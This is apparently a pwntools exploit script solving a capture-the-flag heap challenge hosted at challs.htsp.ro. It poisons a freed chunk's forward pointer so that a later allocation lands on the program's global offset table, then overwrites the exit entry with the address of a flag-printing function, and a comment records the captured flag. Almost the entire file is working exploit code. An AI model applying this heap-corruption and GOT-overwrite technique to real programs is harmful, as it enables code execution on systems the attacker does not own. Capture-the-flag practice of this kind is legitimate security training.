from pwn import *
#r = process(['./main'])
r = remote("challs.htsp.ro", 8003)
import time
# input()
r.sendline(b"1\n0\na") # allocate 0
time.sleep(1.1)
# queue edit 0
r.sendline(b"3\n0\n" + p64(0x6020a8))
# delete 0
r.sendline(b"4\n0")
# allocate new gift on top
time.sleep(1.1)
# move fd to tcache top
r.sendline(b"1\n1\nb")
time.sleep(1.1)
# new gift has name pointing to GOT, ovewrite exit with Flag
r.sendline(b"1\n2\n" + p64(0x400c6a))
time.sleep(1.1)
# exit
r.sendline(b"0")
# X-MAS{KR4mpu5_91Ft5_4r3_5OM3WH4t_M15l34d1n}

r.interactive()
